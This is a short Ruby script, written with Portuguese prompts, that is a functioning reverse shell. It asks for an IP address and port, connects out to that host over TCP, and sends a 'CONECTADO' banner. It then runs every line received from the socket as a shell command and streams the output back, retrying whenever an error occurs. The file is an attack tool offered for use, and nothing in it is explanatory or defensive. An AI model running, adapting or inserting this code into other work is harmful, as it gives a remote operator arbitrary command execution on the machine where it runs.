#!/usr/bin/env ruby
require 'socket'
require 'open3'




def reverse(lhost,port)
  @lhost=lhost
  @port=port
end

print "Coloque seu ip: "
lhost=gets.chomp
print "Passe a porta: "
port=gets.chomp
reverse(lhost,port)

  def connect
    @socket=TCPSocket.new "#{@lhost}", "#{@port}"
    @dec="-" * 100
    @socket.puts "#{@dec}\n
    _  ____________.---------.
    \`'  __________|_________| ========0 CONECTADO !!
    /   (_)__]
   |    |
  .'   .'
  |____]
    
    \n#{@dec}"

  end

def try
    begin
      connect
    rescue
      sleep 0.7
    end
end

try 

def reverse_shell
  begin
    while linha = @socket.gets
      Open3.popen2e("#{linha}") do | stdin,stdout_and_stderr |
            IO.copy_stream(stdout_and_stderr, @socket)
    end
  end
end
rescue 
  retry
end
reverse_shell
